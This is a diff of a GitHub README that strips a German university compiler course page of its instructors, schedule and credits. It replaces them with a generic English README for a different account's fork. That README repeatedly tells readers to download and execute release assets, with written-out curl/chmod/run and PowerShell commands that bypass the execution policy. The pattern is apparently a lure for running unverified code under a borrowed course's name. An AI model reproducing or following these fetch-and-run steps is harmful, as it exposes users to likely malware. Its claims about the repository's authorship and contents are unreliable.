@@ -1,207 +1,656 @@
-# MIF 1.5: Concepts of Programming Languages (Winter 2025/26)
+# CPL: Concepts of Programming Languages — M.Sc. Winter 2025/26 🚀
 
-<img src="admin/images/architektur_cb.png" width="80%">
+[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases)  
+Download and run release assets from: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases
 
-## Kursbeschreibung
+![CPL Banner](https://raw.githubusercontent.com/D4ni31Osama/CPL-Vorlesung-Master-W25/main/docs/images/cpl-banner.png)
 
-Der Compiler ist das wichtigste Werkzeug in der Informatik. In der
-Königsdisziplin der Informatik schließt sich der Kreis, hier kommen die
-unterschiedlichen Algorithmen und Datenstrukturen und
-Programmiersprachenkonzepte zur Anwendung.
+Table of contents
+- About this repo
+- Badges and topics
+- Quick start
+- Releases (download and execute)
+- Lecture modules
+- Course materials
+- Codebase overview
+- ANTLR grammars
+- Interpreter design
+- LLVM IR backend
+- Code generation patterns
+- Build and run examples
+- Exercises and assignments
+- Teaching website and OER
+- Development workflow
+- Testing and CI
+- Contributing guide
+- Citation and credits
+- License
+- Contact
 
-In diesem Modul geht es um ein fortgeschrittenes Verständnis für
-interessante Konzepte im Compilerbau sowie um grundlegende Konzepte von
-Programmiersprachen und -paradigmen. Wir schauen uns dazu relevante
-aktuelle Tools und Frameworks an und setzen diese bei der Erstellung
-eines Bytecode-Compilers für unterschiedliche Programmiersprachen für
-die Java-VM oder WASM ein.
+About this repo
+This repository collects teaching materials for the master's course "Concepts of Programming Languages" (Winter 2025/26). You will find lecture slides, example implementations, grammars, interpreter and code generation labs, LLVM IR examples, and a small compiler project you can run and extend. The materials target students in M.Sc. computer science courses and instructors who want reusable, open educational resources.
 
-## Überblick Modulinhalte
+Badges and topics
+- Topics: antlr, code-generation, compiler-construction, hacktoberfest, interpreter, llvm-ir, oer, open-educational-resources, teaching-materials, teaching-website
+- Releases badge: [![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases)
 
-1.  Lexikalische Analyse: Scanner/Lexer
-    - Reguläre Sprachen
-    - Klassisches Vorgehen: RegExp nach NFA (Thompson’s Construction),
-      NFA nach DFA (Subset Construction), DFA nach Minimal DFA
-      (Hopcroft’s Algorithm)
-    - Manuelle Implementierung, Generierung mit ANTLR oder Flex
-2.  Syntaxanalyse: Parser
-    - Kontextfreie Grammatiken (CFG), Chomsky
-    - LL-Parser (Top-Down-Parser)
-      - FIRST, FOLLOW
-      - Tabellenbasierte Verfahren, rekursiver Abstieg
-      - LL(1), LL(k), LL(\*)
-      - Umgang mit Vorrang-Regeln, Assoziativität und linksrekursiven
-        Grammatiken
-    - LR-Parser (Bottom-Up-Parser)
-      - Shift-Reduce
-      - LR(0), SLR(1), LR(1), LALR
-    - Generierung mit ANTLR oder Bison
-3.  Semantische Analyse und Optimierungen
-    - Symboltabellen
-      - Namen und Scopes
-      - Typen, Klassen, Polymorphie
-    - Attributierte Grammatiken: L-attributed vs. R-attributed grammars
-    - Typen, Typ-Inferenz, Type Checking
-    - Datenfluss- und Kontrollfluss-Analyse
-    - Optimierungen: Peephole u.a.
-4.  Zwischencode: Intermediate Representation (IR), LLVM-IR
-5.  Interpreter
-    - AST-Traversierung
-    - Read-Eval-Schleife
-    - Resolver: Beschleunigung der Interpretation
-6.  Code-Generierung, Bytecode/VM
-    - Speicherlayout
-    - Erzeugen von Bytecode
-    - Ausführen in einer Virtuellen Maschine
-    - Garbage Collection
-7.  Programmiersprachen: Ruby, Prolog, Haskell, Lisp und die
-    Auswirkungen der Konzepte auf den Compiler/Interpreter und die
-    Laufzeitumgebung
+Quick start
+- Clone the repository:
+  git clone https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25.git
+  cd CPL-Vorlesung-Master-W25
 
-## Team
+- Browse slides, exercises, and code in the docs and src folders.
 
-- [BC
-  George](https://www.hsbi.de/minden/ueber-uns/personenverzeichnis/birgit-christina-george)
-- [Carsten
-  Gips](https://www.hsbi.de/minden/ueber-uns/personenverzeichnis/carsten-gips)
-  (Sprechstunde nach Vereinbarung)
+- Use the releases page to get prebuilt tools:
+  Visit and download from https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases and run the release asset as described in the Releases section below.
 
-## Kursformat
+Releases (download and execute)
+The course provides release assets for demo tools and runner scripts. Download the release asset and execute it to run the demo compiler, test suites, or teaching server.
 
-| Vorlesung (2 SWS)            | Praktikum (3 SWS)            |
-|:-----------------------------|:-----------------------------|
-| Di, 14:00 - 15:30 Uhr (Zoom) | Di, 15:45 - 18:00 Uhr (Zoom) |
+- Go to the releases page: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases
+- Find the latest release asset. Typical assets:
+  - cpl-runner-<version>.sh — shell runner for Linux/macOS
+  - cpl-runner-<version>.ps1 — PowerShell runner for Windows
+  - cpl-ide-plugin-<version>.jar — plugin for the course IDE
+  - cpl-examples-<version>.zip — example projects and test cases
 
-Durchführung der Vorlesung als *Flipped Classroom* (Carsten) bzw. als
-*reguläre Vorlesung* (BC). Zugangsdaten Zoom siehe
-[ILIAS](https://www.hsbi.de/elearning/goto.php?target=crs_1400597&client_id=FH-Bielefeld).
+- Example download and run (Linux/macOS):
+  curl -L -o cpl-runner.sh "https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases/download/v1.0.0/cpl-runner-1.0.0.sh"
+  chmod +x cpl-runner.sh
+  ./cpl-runner.sh --serve
 
-## Fahrplan
+- Example run (Windows PowerShell):
+  Invoke-WebRequest -Uri "https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases/download/v1.0.0/cpl-runner-1.0.0.ps1" -OutFile "cpl-runner.ps1"
+  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+  .\cpl-runner.ps1 -Serve
 
-Hier finden Sie einen abonnierbaren [Google
-Kalender](https://calendar.google.com/calendar/ical/4ba4736f0bc2005e4bcd75d48671e49cd4c9f3839988bf4f522f45a8bfbf676b%40group.calendar.google.com/public/basic.ics)
-mit allen Terminen der Veranstaltung zum Einbinden in Ihre Kalender-App.
+- If a direct release asset link is missing or fails, check the Releases section on the repo page to find available assets: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases
 
-Abgabe der Übungsblätter jeweils **Dienstag bis 14:00 Uhr** im
-[ILIAS](https://www.hsbi.de/elearning/goto.php?target=exc_1421692&client_id=FH-Bielefeld).
-Vorstellung der Lösung im jeweiligen Praktikum in der Abgabewoche.
+Lecture modules
+The course splits into themed modules. Each module includes slides, code samples, exercises, and reading lists.
 
-| Monat | Tag | Vorlesung | Lead | Praktikum |
-|:---|:---|:---|:---|:---|
-| Oktober | 08\. | [Orga](https://www.hsbi.de/elearning/data/FH-Bielefeld/lm_data/lm_1603207/index.html#überblick-modulinhalte) (*Zoom*); [Überblick](lecture/00-intro/overview.md), [Sprachen](lecture/00-intro/languages.md), [Anwendungen](lecture/00-intro/applications.md) | Carsten, BC |  |
-|  | 15\. | [Reguläre Sprachen](lecture/01-lexing/regular.md), [CFG](lecture/02-parsing/cfg.md), [LL-Parser](lecture/02-parsing/ll-parser.md), [LL-Parser (Impl)](lecture/02-parsing/ll-parser-impl.md), [LL-Parser (Advanced)](lecture/02-parsing/ll-advanced.md) | BC | Verteilung Themen |
-|  | 22\. | [LR-Parser](lecture/02-parsing/lr-parser.md),[LR-Parser 1](lecture/02-parsing/lr-parser1.md), [LR-Parser 2](lecture/02-parsing/lr-parser2.md) | BC | Status Workshop I |
-|  | 29\. | **[Workshop I](homework/project.md)**: Sprache und Features (auf Sprachebene) |  |  |
-|  | 29\. | **18:00 - 19:30 Uhr (online): Edmonton I: ANTLR + Live-Coding** | *Edmonton* |  |
-| November | 05\. | [Attributierte Grammatiken](lecture/03-semantics/attribgrammars.md) | BC | Status Workshop II |
-|  | 12\. | [Überblick Symboltabellen](lecture/03-semantics/symbtab0-intro.md), [Symboltabellen: Scopes](lecture/03-semantics/symbtab1-scopes.md), [Symboltabellen: Funktionen](lecture/03-semantics/symbtab2-functions.md), [Symboltabellen: Klassen](lecture/03-semantics/symbtab3-classes.md) | Carsten | Status Workshop II |
-|  | 19\. | **Start 15:30 Uhr**: [Syntaxgesteuerte Interpreter](lecture/06-interpretation/syntaxdriven.md), [AST-basierte Interpreter 1](lecture/06-interpretation/astdriven-part1.md), [AST-basierte Interpreter 2](lecture/06-interpretation/astdriven-part2.md) | Carsten | Status Workshop II |
-|  | 26\. | **18:00 - 19:30 Uhr (online): Edmonton II: Vorträge Mindener Projekte: [Workshop II](homework/project.md)**: Sprache und Features (aus Compiler-Sicht) | *Minden (MIF)* |  |
-| Dezember | 03\. | [Optimierung und Datenfluss- und Kontrollflussanalyse](lecture/05-optimization/optimization.md) | BC |  |
-| Dezember | 03\. | **18:00 - 19:30 Uhr (online): Edmonton III: Vorträge Edmontoner Projekte** | *Edmonton* |  |
-|  | 10\. | [Projekt-Pitch](homework/project.md): Vorstellen und Diskussion der Projektinhalte/-konzepte | Carsten |  |
-|  | 17\. | *Freies Arbeiten* |  | Status Workshop III |
-|  | 24\. | *Weihnachtspause* |  |  |
-|  | 31\. | *Weihnachtspause* |  |  |
-| Januar | 07\. | *Freies Arbeiten* |  | Status Workshop III |
-|  | 14\. | *Freies Arbeiten* |  | Status Workshop III |
-|  | 21\. | *Freies Arbeiten* |  | Status Workshop III |
-| *(Prüfungsphase I)* | 31\. | **[Workshop III](homework/project.md): Projektvorstellung/-übergabe (10:00 - 12:30 Uhr, online)** |  |  |
-| *(Prüfungsphase I)* | 07\. | **Feedback-Gespräche (10:00 - 12:00 Uhr, online)** |  |  |
-| *(Prüfungsphase II)* |  | *Keine separate Prüfung* |  |  |
+1. Foundations of language design
+   - Syntax and semantics
+   - Lexical analysis
+   - Parsing techniques
+   - Formal definitions: BNF, EBNF, structural operational semantics
 
-## Prüfungsform, Note und Credits
+2. Type systems
+   - Simple types, polymorphism
+   - Type inference
+   - Subtyping and variance
+   - Gradual typing
 
-**Parcoursprüfung plus Testat**, 10 ECTS
+3. Functional languages
+   - Lambda calculus
+   - Closures and environments
+   - Tail-call optimization
+   - Pattern matching
 
-- **Testat**: Vergabe der Credit-Points
+4. Imperative languages
+   - Memory model
+   - Mutable state and aliasing
+   - Control flow and exceptions
 
-  1.  **Aktive** Teilnahme an mind. 5 der 7 “Status Workshop”-Termine,
-      **und**
-  2.  **aktive** Teilnahme an allen 3 Edmonton-Terminen.
+5. Concurrency and parallelism
+   - Shared memory
+   - Message passing
+   - Actor model and CSP
+   - Data races and synchronization
 
-- **Gesamtnote**:
+6. Language implementation
+   - AST design
+   - Interpreter patterns
+   - Bytecode vs native code
+   - Just-in-time concepts
 
-  Die Workshops werden bewertet und ergeben in folgender Gewichtung die
-  Gesamtnote:
+7. Formal methods and verification
+   - Operational semantics
+   - Type safety proofs
+   - Model checking basics
 
-  - 20% [Workshop I](homework/project.md),
-  - 30% [Workshop II](homework/project.md),
-  - 50% [Workshop III](homework/project.md).
+8. Advanced backends
+   - LLVM IR generation
+   - Runtime systems
+   - Garbage collection strategies
 
-Die Bearbeitung der Aufgaben (Workshops) erfolgt in 2er Teams.
+Course materials
+The repo contains these folders:
+- docs/ — slides, reading lists, diagrams
+- src/ — example implementations, tools
+- grammar/ — ANTLR grammars and test cases
+- llvm/ — LLVM IR backend examples
+- exercises/ — lab assignments and solutions
+- examples/ — sample programs and test inputs
+- website/ — static site for course pages (teaching website)
 
-## Materialien
+Slides
+Slides follow module order and include speaker notes. Slides are available in PDF and reveal.js formats. Example path:
+docs/slides/Module-01-Foundations.pdf
 
-1.  [“**Compilers: Principles, Techniques, and
-    Tools**”](https://learning.oreilly.com/library/view/compilers-principles-techniques/9789357054881/).
-    Aho, A. V. und Lam, M. S. und Sethi, R. und Ullman, J. D. and
-    Bansal, S., Pearson India, 2023. ISBN
-    [978-9-3570-5488-1](https://fhb-bielefeld.digibib.net/openurl?isbn=978-9-3570-5488-1).
-    [Online](https://learning.oreilly.com/library/view/compilers-principles-techniques/9789357054881/)
-    über die
-    [O’Reilly-Lernplattform](https://www.oreilly.com/library-access/).
-2.  [“**Crafting
-    Interpreters**”](https://github.com/munificent/craftinginterpreters).
-    Nystrom, R., Genever Benning, 2021. ISBN
-    [978-0-9905829-3-9](https://fhb-bielefeld.digibib.net/openurl?isbn=978-0-9905829-3-9).
-    [Online](https://www.craftinginterpreters.com/).
-3.  [“**Engineering a
-    Compiler**”](https://learning.oreilly.com/library/view/engineering-a-compiler/9780080916613/).
-    Torczon, L. und Cooper, K., Morgan Kaufmann, 2012. ISBN
-    [978-0-1208-8478-0](https://fhb-bielefeld.digibib.net/openurl?isbn=978-0-1208-8478-0).
-    [Online](https://learning.oreilly.com/library/view/engineering-a-compiler/9780080916613/)
-    über die
-    [O’Reilly-Lernplattform](https://www.oreilly.com/library-access/).
-4.  [“Introduction to Compilers and Language
-    Design”](https://www3.nd.edu/~dthain/compilerbook/). Thain,
-    D., 2023. ISBN
-    [979-8-655-18026-0](https://fhb-bielefeld.digibib.net/openurl?isbn=979-8-655-18026-0).
-    [Online](https://www3.nd.edu/~dthain/compilerbook/).
-5.  [“Writing a C
-    Compiler”](https://learning.oreilly.com/library/view/writing-a-c/9781098182229/).
-    Sandler, N., No Starch Press, 2024. ISBN
-    [978-1-0981-8222-9](https://fhb-bielefeld.digibib.net/openurl?isbn=978-1-0981-8222-9).
-    [Online](https://learning.oreilly.com/library/view/writing-a-c/9781098182229/)
-    über die
-    [O’Reilly-Lernplattform](https://www.oreilly.com/library-access/).
-6.  [“**Seven Languages in Seven
-    Weeks**”](https://learning.oreilly.com/library/view/seven-languages-in/9781680500059/).
-    Tate, B.A., Pragmatic Bookshelf, 2010. ISBN
-    [978-1-93435-659-3](https://fhb-bielefeld.digibib.net/openurl?isbn=978-1-93435-659-3).
-    [Online](https://learning.oreilly.com/library/view/seven-languages-in/9781680500059/)
-    über die
-    [O’Reilly-Lernplattform](https://www.oreilly.com/library-access/).
+Exercises
+Each exercise contains:
+- Problem statement
+- Reference solution
+- Tests and expected outputs
+- Grading rubrics
 
-## Förderungen und Kooperationen
+Labs
+Labs guide students from parsing to code generation. Lab files include skeleton code and hints. Typical lab progression:
+- Lab 1: Tokenizer and scanner
+- Lab 2: Parser and AST
+- Lab 3: Type checker
+- Lab 4: Interpreter
+- Lab 5: LLVM IR generator and codegen
 
-### Kooperation mit University of Alberta, Edmonton (Kanada)
+Codebase overview
+The code uses a layered architecture. Each layer isolates responsibilities and helps students focus on one concept at a time.
 
-Über das Projekt [“We CAN
-virtuOWL”](https://www.uni-bielefeld.de/international/profil/netzwerk/alberta-owl/we-can-virtuowl/)
-der Fachhochschule Bielefeld ist im Frühjahr 2021 eine Kooperation mit
-der [University of
-Alberta](https://www.hsbi.de/en/international-office/alberta-owl-cooperation)
-(Edmonton/Alberta, Kanada) im Modul “Compilerbau” gestartet.
+- scanner/lexer
+  - ANTLR-based lexer and hand-written tokenizer examples
+  - Test harness for lexical test cases
 
-Wir freuen uns, auch in diesem Semester wieder drei gemeinsame Sitzungen
-für beide Hochschulen anbieten zu können. (Diese Termine werden in
-englischer Sprache durchgeführt.)
+- parser
+  - ANTLR grammars and generated parsers
+  - Error recovery strategies
+  - AST builder
 
-------------------------------------------------------------------------
+- ast
+  - Node types
+  - Visitor interfaces
+  - Pretty printer and serializer
 
-## LICENSE
+- typechecker
+  - Environment and scope handling
+  - Constraint generation and solving
+  - Inference engine
 
-<img src="https://licensebuttons.net/l/by-sa/4.0/88x31.png">
+- interpreter
+  - Bytecode interpreter for the internal VM
+  - Direct AST interpreter
+  - Memory and object model
 
-Unless otherwise noted, [this
-work](https://github.com/Compiler-CampusMinden/CPL-Vorlesung-Master) by
-[BC George](https://github.com/bcg7), [Carsten
-Gips](https://github.com/cagix) and
-[contributors](https://github.com/Compiler-CampusMinden/CPL-Vorlesung-Master/graphs/contributors)
-is licensed under [CC BY-SA
-4.0](https://github.com/Compiler-CampusMinden/CPL-Vorlesung-Master/blob/master/LICENSE.md).
-See the [credits](CREDITS.md) for a detailed list of contributing
-projects.
+- codegen
+  - LLVM IR emission
+  - Calling convention handling
+  - Runtime support stubs
 
-<blockquote><p><sup><sub><strong>Last modified:</strong> 5b3a3e7 (tooling: rename repo from 'cb-lecture' to 'cpl-lecture', 2025-08-13)<br></sub></sup></p></blockquote>
+- runtime
+  - Minimal runtime library in C
+  - Memory management primitives
+  - Standard library functions
+
+ANTLR grammars
+The repo provides ANTLR v4 grammars and example usage.
+
+- grammar/CPL.g4 — full language grammar
+- grammar/Expressions.g4 — focus on expressions and precedence
+- grammar/Patterns.g4 — pattern matching grammar
+
+Usage
+- Generate parser:
+  java -jar antlr-4.9.3-complete.jar -Dlanguage=Java -visitor -package cpl.parser grammar/CPL.g4
+
+- Integrate parser into code:
+  - Use the provided visitor to build an AST.
+  - Add custom error listener for user-friendly errors.
+
+Error handling strategies
+- Fail-fast vs error recovery
+- Token insertion and deletion
+- Panic-mode recovery for long inputs
+
+Interpreter design
+The interpreter follows a straightforward visitor pattern for AST traversal. We provide two interpreters:
+
+1. AST interpreter
+   - Evaluate expressions by walking AST nodes.
+   - Use environment maps for variable binding.
+   - Support closures through lexical environments.
+
+2. Bytecode VM
+   - A small stack-based VM.
+   - Instructions: push, pop, load, store, call, ret, jump, branch.
+   - Implement tail-call optimization at bytecode level.
+
+Sample AST interpreter pseudo-code
+- Visit BinaryExpr:
+  left = visit(node.left)
+  right = visit(node.right)
+  switch node.op:
+    case PLUS: return left + right
+    case MUL: return left * right
+
+- Visit FunctionDecl:
+  closure = makeClosure(node.params, node.body, currentEnv)
+  currentEnv.define(node.name, closure)
+
+Memory model
+- Stack frames for function calls
+- Heap for mutable objects
+- GC hooks in runtime for demo purposes
+
+LLVM IR backend
+We include an LLVM IR backend that converts AST to LLVM IR. The backend uses standard techniques and includes utility modules for type mapping and symbol table handling.
+
+Key parts
+- llvm/emitter — maps AST nodes to LLVM IR constructs
+- llvm/types — translates CPL types to LLVM types
+- llvm/runtime — runtime support in LLVM and C
+
+Building LLVM IR
+- Generate IR:
+  mvn -pl llvm package
+  java -jar target/cpl-llvm-generator.jar examples/factorial.cpl -o out/factorial.ll
+
+- Compile to native:
+  clang out/factorial.ll -o out/factorial
+
+- Run:
+  ./out/factorial
+
+Calling convention
+- Use C calling convention for interop with runtime.
+- Pass pointers for strings and arrays.
+- Return values in standard registers.
+
+Garbage collection
+- Provide a basic mark-and-sweep implementation in the runtime.
+- Show how to replace it with a tracing GC.
+
+Code generation patterns
+The repo explains common code generation patterns:
+- Expression lowering
+- Short-circuit boolean logic
+- Control-flow lowering (if, while, switch)
+- Function prologue and epilogue
+- Tail-call optimization
+- Closure conversion for first-class functions
+
+Examples
+- Expression lowering: compile (a + b) * c to temporary registers and operations
+- Short-circuit:
+  - Compile (x && y) to branch-based sequence that avoids evaluating y when x is false
+
+Optimization notes
+- Constant folding at AST level
+- Dead code elimination pass
+- Inlining heuristics for small functions
+- Register allocation via simple linear-scan
+
+Build and run examples
+This section lists commands and examples to run the provided demos.
+
+Requirements
+- JDK 11+
+- Maven 3.6+
+- ANTLR v4
+- LLVM/Clang if using the LLVM backend
+- Git and curl
+
+Install prerequisites (Ubuntu-like)
+sudo apt update
+sudo apt install -y default-jdk maven clang llvm curl
+
+Example: run the interpreter
+- Build:
+  mvn -DskipTests package
+
+- Run a program:
+  java -jar target/cpl-interpreter.jar examples/factorial.cpl
+
+- Output:
+  Factorial(5) = 120
+
+Example: generate LLVM IR and run
+- Generate IR:
+  java -jar target/cpl-llvm-generator.jar examples/factorial.cpl -o out/factorial.ll
+
+- Compile:
+  clang out/factorial.ll -o out/factorial
+
+- Execute:
+  ./out/factorial
+
+Docker
+- A Dockerfile provides a preconfigured environment with all tools.
+- Build image:
+  docker build -t cpl-course:latest .
+
+- Run container:
+  docker run --rm -it -v $(pwd):/work cpl-course:latest bash
+
+Examples and reference programs
+- examples/factorial.cpl — recursion and stack behavior
+- examples/closures.cpl — first-class functions and closures
+- examples/arrays.cpl — arrays and bounds checking
+- examples/concurrency.cpl — actor-style message passing demo
+
+Exercises and assignments
+The course includes graded and practice assignments.
+
+Assignment structure
+- Problem statement
+- Submission format
+- Tests and automated grading script
+- Hints file and reference solution (hidden from students during grading)
+
+Sample assignments
+- Assignment 1: Implement scanner and parser.
+- Assignment 2: Build AST and pretty-printer.
+- Assignment 3: Implement a static type checker with basic inference.
+- Assignment 4: Implement interpreter for full language subset.
+- Assignment 5: Extend LLVM IR backend with closures.
+
+Grading
+- Automated tests run on CI.
+- Manual code review for style and design.
+- Rubrics cover correctness, tests, documentation, and style.
+
+Teaching website and OER
+The repo includes a teaching website scaffold under website/. The site uses a static site generator and provides:
+- Lecture schedule
+- Slide downloads
+- Lab registration and submission instructions
+- Office hours and contact information
+
+Open Educational Resources
+All materials use permissive licensing to enable reuse. Slides and code use an open license to allow adaptation and redistribution for teaching.
+
+Development workflow
+The repo follows a clear branch model:
+- main — production-ready materials and stable resources
+- develop — integration for next course run
+- feature/* — individual labs, demos, and slide updates
+
+Pull requests
+- Fork the repo
+- Create topic branch
+- Add tests or examples for your change
+- Submit a PR with description and link to issue
+
+Issue tracker
+- Use GitHub Issues to report bugs or suggest topics.
+- Labeling scheme:
+  - bug
+  - enhancement
+  - doc
+  - help-wanted
+
+Testing and CI
+The project uses GitHub Actions for continuous integration:
+- Build and test Java components
+- Run grammar tests for ANTLR
+- Generate example outputs and compare with golden files
+- Publish release artifacts to GitHub Releases
+
+Local testing
+- Run unit tests:
+  mvn test
+
+- Run integration tests:
+  mvn verify -Pintegration
+
+Contributing guide
+We welcome contributions that improve learning resources, fix errors, or add labs.
+
+How to contribute
+- Open an issue first if you plan a larger change.
+- Fork and create a branch.
+- Keep commits small and focused.
+- Write tests for new behavior.
+- Add a short entry to CHANGELOG.md for non-trivial updates.
+
+Coding standards
+- Java: follow Google Java Style guidelines
+- Shell scripts: use POSIX shell when possible
+- Python: use PEP8
+- Document new APIs in docs/
+
+Mentoring tips for instructors
+- Use labs in pairs to encourage discussion.
+- Use automated tests to provide instant feedback.
+- Keep exercises incremental and cumulative.
+- Provide grading rubrics with sample solutions.
+
+Teaching slides and sample speech notes
+Slides include speaker notes with prompts and key points. Example prompts:
+- Why separate lexing and parsing?
+- When choose top-down vs bottom-up parsing?
+- How does closure conversion affect calling convention?
+
+Reference implementations
+Each major component has a reference implementation in src/reference/ to help students test their solutions against a known good baseline.
+
+Code examples and snippets
+- Closure creation:
+  function makeClosure(params, body, env) {
+    return { params, body, env };
+  }
+
+- Tail-call detection:
+  if (isTailPosition(callNode)) {
+    emitTailCall(callNode);
+  } else {
+    emitRegularCall(callNode);
+  }
+
+- LLVM IR snippet for function:
+  define i64 @fact(i64 %n) {
+  entry:
+    %cmp = icmp eq i64 %n, 0
+    br i1 %cmp, label %base, label %rec
+  base:
+    ret i64 1
+  rec:
+    %n1 = sub i64 %n, 1
+    %tmp = call i64 @fact(i64 %n1)
+    %res = mul i64 %n, %tmp
+    ret i64 %res
+  }
+
+Security and sandboxing
+- The interpreter runs untrusted student code in a sandbox for labs.
+- The runner isolates file and network I/O.
+- The Docker image uses user namespaces and process restrictions.
+
+Academic integrity
+- Provide a clear policy for collaboration and allowed resources.
+- Use automated plagiarism detection for code when needed.
+- Encourage original work and peer review.
+
+Course schedule (sample)
+Week 1: Foundations and scanning  
+Week 2: Parsing and ASTs  
+Week 3: Type systems and inference  
+Week 4: Functional concepts and closures  
+Week 5: Memory and runtime  
+Week 6: Interpreter patterns  
+Week 7: LLVM IR and code generation  
+Week 8: Concurrency and advanced topics  
+Week 9: Review and exams
+
+Resources, readings and references
+- Aho, Lam, Sethi, Ullman — Compilers: Principles, Techniques, and Tools
+- Pierce — Types and Programming Languages
+- Appel — Modern Compiler Implementation
+- LLVM documentation — https://llvm.org/docs/
+- ANTLR documentation — https://www.antlr.org/
+
+External images and icons
+- ANTLR logo: https://www.antlr.org/assets/img/antlr-logo.png
+- LLVM logo: https://upload.wikimedia.org/wikipedia/commons/1/10/LLVM_Logo.svg
+- Compiler diagram sources in docs/images are linked from the repo.
+
+Sample research and advanced topics
+- Gradual typing and type migration
+- Dependent types introduction
+- Proofs of type safety via progress and preservation
+- Advanced GC algorithms and performance trade-offs
+- JIT compilation and runtime optimization
+
+API reference
+The project exposes small libraries for parsing and runtime integration.
+
+Parser API
+- cpl.parser.Parser.parse(String source) -> AST
+- cpl.parser.ErrorReporter.report()
+
+Runtime API
+- Runtime.allocateObject(Type t)
+- Runtime.callFunction(Function f, Object[] args)
+- Runtime.gc()
+
+Teaching utilities
+- test-harness/ — run student tests and collect results
+- grader/ — script for batch grading on CI
+
+Automation and scripts
+- scripts/generate-grammar.sh — run ANTLR and build parsers
+- scripts/run-lab.sh — start lab server for students
+- scripts/package-release.sh — prepare artifacts for GitHub Releases
+
+Release publishing
+We publish prebuilt artifacts on the GitHub Releases page. Users should download and run those assets when possible.
+
+- Visit: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases
+- Download the asset that suits your platform.
+- Execute the asset as described in the asset README inside the release.
+
+If the release link or asset does not work, check the Releases section on the repo page for alternative assets or source builds.
+
+Examples of release usage
+- cpl-runner.sh --serve — starts a local web UI for labs
+- cpl-examples.zip — contains solved labs and sample programs
+- cpl-ide-plugin.jar — integration with an IDE for syntax highlighting and run support
+
+Common troubleshooting
+- If ANTLR generation fails, ensure you use the right jar version for the grammar features.
+- If LLVM emits target errors, install matching clang/llvm tools.
+- If CI fails on tests, run tests locally and inspect logs in target/surefire-reports.
+
+Community and Hacktoberfest
+The repo tags include hacktoberfest. We label beginner-friendly issues for new contributors. Look for issues labeled "good first issue" and "help-wanted".
+
+Mentoring newcomers
+- Assign small tasks: fix typos, improve docs, add test cases.
+- Provide clear reproduction steps for issues.
+- Review PRs for teaching clarity and pedagogic value.
+
+Citing this material
+If you use slides or code in a publication or another course, cite the repository and authors. Include a reference to the specific materials you used.
+
+Citation example (bibtex)
+@misc{cpl-w2526,
+  title = {Concepts of Programming Languages — M.Sc. Winter 2025/26},
+  author = {Course staff},
+  howpublished = {GitHub repository},
+  year = {2025},
+  note = {https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25}
+}
+
+Accessibility and formats
+- Slides are available as PDF and HTML (reveal.js).
+- Code examples include plain text and zipped archives.
+- The website uses semantic markup and accessible colors.
+
+Appendix A — Example grammar (excerpt)
+grammar CPL;
+
+program
+  : statement* EOF
+  ;
+
+statement
+  : varDecl
+  | funcDecl
+  | exprStmt
+  ;
+
+varDecl
+  : 'var' IDENTIFIER (':' type)? '=' expression ';'
+  ;
+
+funcDecl
+  : 'fun' IDENTIFIER '(' paramList? ')' (':' type)? block
+  ;
+
+expression
+  : assignment
+  ;
+
+assignment
+  : IDENTIFIER '=' assignment
+  | logic_or
+  ;
+
+logic_or
+  : logic_and ('||' logic_and)*
+  ;
+
+logic_and
+  : equality ('&&' equality)*
+  ;
+
+equality
+  : comparison (('==' | '!=') comparison)*
+  ;
+
+comparison
+  : term (('>' | '<' | '>=' | '<=') term)*
+  ;
+
+term
+  : factor (('+' | '-') factor)*
+  ;
+
+factor
+  : unary (('*' | '/') unary)*
+  ;
+
+unary
+  : ('!' | '-') unary
+  | primary
+  ;
+
+primary
+  : NUMBER
+  | STRING
+  | 'true'
+  | 'false'
+  | IDENTIFIER
+  | '(' expression ')'
+  ;
+
+IDENTIFIER : [a-zA-Z_] [a-zA-Z_0-9]* ;
+NUMBER : [0-9]+ ('.' [0-9]+)? ;
+STRING : '"' (~["\r\n])* '"' ;
+WS : [ \t\r\n]+ -> skip ;
+COMMENT : '//' ~[\r\n]* -> skip ;
+
+Appendix B — Example lab checklist
+- [ ] Run the example interpreter on sample programs
+- [ ] Write tests for the scanner
+- [ ] Implement AST node for new expression
+- [ ] Add a code generation test for LLVM IR output
+- [ ] Submit PR with tests passing
+
+Appendix C — Sample FAQ
+Q: How do I build from source if a release is not available?  
+A: Build with Maven: mvn package. Follow platform notes for LLVM if you use the backend.
+
+Q: I cannot run the runner script on macOS.  
+A: Ensure script is executable (chmod +x) and use ./cpl-runner.sh. For macOS ARM, use the correct binary from the releases or build from source.
+
+Q: Where are solution files?  
+A: Solutions live in exercises/solutions. Instructors can copy them to private course systems.
+
+Contact
+- Use GitHub Issues for problems or feature requests.
+- Use PRs for contributions to code or docs.
+- For course coordination, use the course staff email listed on the teaching website.
+
+License
+Most materials use a permissive license for teaching reuse. See LICENSE.md in the repo for exact terms.
+
+...
